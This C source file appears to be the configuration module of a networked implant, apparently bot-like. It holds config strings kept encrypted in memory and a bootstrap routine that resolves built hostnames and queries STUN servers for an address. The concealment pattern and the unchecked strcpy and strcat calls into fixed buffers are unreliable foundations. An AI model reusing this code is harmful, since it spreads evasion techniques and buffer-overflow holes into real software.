#include "config.h"
#include "config_data.h"
#include "crypto.h"
#include "drifter.h"
#include "resolver.h"

#include <arpa/inet.h>
#include <netinet/in.h>
#include <stdint.h>
#include <stdlib.h>
#include <string.h>
#include <sys/socket.h>
#include <sys/time.h>
#include <unistd.h>

#define CONFIG_BOOTSTRAP_INDEX 75
#define STUN_BINDING_REQUEST_SIZE 20
#define STUN_MAGIC_COOKIE 0x2112a442u
#define STUN_XOR_MAPPED_ADDRESS 0x0020u
#define STUN_SERVER_PORT 3478
#define STUN_RESPONSE_CAPACITY 512

Blob *g_config;
uint32_t g_bootstrap_address;

static uint16_t read_be16(const unsigned char *p)
{
    return (uint16_t)((uint16_t)p[0] << 8 | (uint16_t)p[1]);
}

static uint32_t read_be32(const unsigned char *p)
{
    return (uint32_t)p[0] << 24 | (uint32_t)p[1] << 16 |
           (uint32_t)p[2] << 8 | (uint32_t)p[3];
}

int config_set(int32_t index, const char *value)
{
    if (index < 0 || value == NULL)
        return -1;

    config_decrypt_entry(index);

    if (g_config[index].data != NULL) {
        memset(g_config[index].data, 0, g_config[index].length);
        free(g_config[index].data);
        g_config[index].data = NULL;
        g_config[index].length = 0;
    }

    size_t length = strlen(value);
    char *copy = calloc(length + 1, 1);
    if (copy == NULL)
        return -1;

    g_config[index].data = copy;
    memcpy(copy, value, length);
    g_config[index].length = length;
    return config_encrypt_entry(index);
}

int config_append_entry(int32_t index, const void *data, int32_t length)
{
    if (index < 0 || length < 0 || (length != 0 && data == NULL))
        return -1;

    Blob *grown = realloc(g_config, ((size_t)index + 1) * sizeof(*g_config));
    if (grown == NULL)
        return -1;
    g_config = grown;

    char *copy = calloc((size_t)length + 1, 1);
    if (copy == NULL)
        return -1;

    g_config[index].data = copy;
    if (length != 0)
        memcpy(copy, data, (size_t)length);
    g_config[index].length = (size_t)length;
    return (int)(intptr_t)copy;
}

int config_initialize(void)
{
    int result = 0;
    for (size_t i = 0; i < config_data_entry_count; ++i) {
        const ConfigDataEntry *entry = &config_data_entries[i];
        result = config_append_entry(entry->index, entry->data, entry->length);
        if (result == -1)
            return -1;
    }
    return result;
}

static void parse_stun_response(const unsigned char *response, ssize_t received)
{
    size_t offset = STUN_BINDING_REQUEST_SIZE;

    while (received >= 0 && offset <= (size_t)received &&
           (size_t)received - offset >= 4) {
        uint16_t type = read_be16(response + offset);
        uint16_t length = read_be16(response + offset + 2);
        size_t remaining = (size_t)received - offset - 4;

        if ((size_t)length > remaining)
            return;

        if (type == STUN_XOR_MAPPED_ADDRESS && length > 7) {
            uint32_t mapped = read_be32(response + offset + 8) ^ STUN_MAGIC_COOKIE;
            g_bootstrap_address = htonl(mapped);
            return;
        }

        offset += 4 + (size_t)length;
        if ((length & 3u) != 0)
            offset += 4 - ((size_t)length & 3u);
    }
}

static int query_bootstrap_address(uint32_t server_address)
{
    int fd = socket(AF_INET, SOCK_DGRAM, 0);
    if (fd < 0)
        return fd;

    struct sockaddr_in server;
    memset(&server, 0, sizeof(server));
    server.sin_family = AF_INET;
    server.sin_port = htons(STUN_SERVER_PORT);
    server.sin_addr.s_addr = server_address;

    unsigned char request[STUN_BINDING_REQUEST_SIZE] = {
        0x00, 0x01, 0x00, 0x00,
        0x21, 0x12, 0xa4, 0x42
    };
    for (size_t i = 8; i < sizeof(request); ++i)
        request[i] = (unsigned char)rand();

    ssize_t sent = sendto(fd, request, sizeof(request), 0,
                          (struct sockaddr *)&server, sizeof(server));
    if (sent == (ssize_t)sizeof(request)) {
        struct timeval timeout;
        timeout.tv_sec = 1;
        timeout.tv_usec = 0;
        (void)setsockopt(fd, SOL_SOCKET, SO_RCVTIMEO,
                         &timeout, sizeof(timeout));

        unsigned char response[STUN_RESPONSE_CAPACITY];
        ssize_t received = recv(fd, response, sizeof(response), 0);
        if (received >= 0)
            parse_stun_response(response, received);
    }

    close(fd);
    return 0;
}

int config_bootstrap(void)
{
    AddressList addresses = {NULL, 0};

    config_decrypt_entry(CONFIG_BOOTSTRAP_INDEX);

    char prefix[16] = {0};
    char *separator = strrchr(g_config[CONFIG_BOOTSTRAP_INDEX].data, '|');
    if (separator != NULL) {
        strcpy(prefix, separator + 1);
        *separator = '\0';
    }

    char *token = strtok(g_config[CONFIG_BOOTSTRAP_INDEX].data, ":");
    while (token != NULL) {
        char hostname[256] = {0};
        strcat(hostname, prefix);
        strcat(hostname, token);

        dns_resolve(&addresses, hostname, 0, 1);
        if (addresses.count != 0) {
            for (int32_t i = 0; i < addresses.count; ++i) {
                int query_result = query_bootstrap_address(addresses.items[i]);
                if (query_result < 0)
                    return query_result;
                if (g_bootstrap_address != 0)
                    break;
            }

            address_list_free(&addresses);
            if (g_bootstrap_address != 0)
                break;
        }

        token = strtok(NULL, ":");
    }

    return config_encrypt_entry(CONFIG_BOOTSTRAP_INDEX);
}
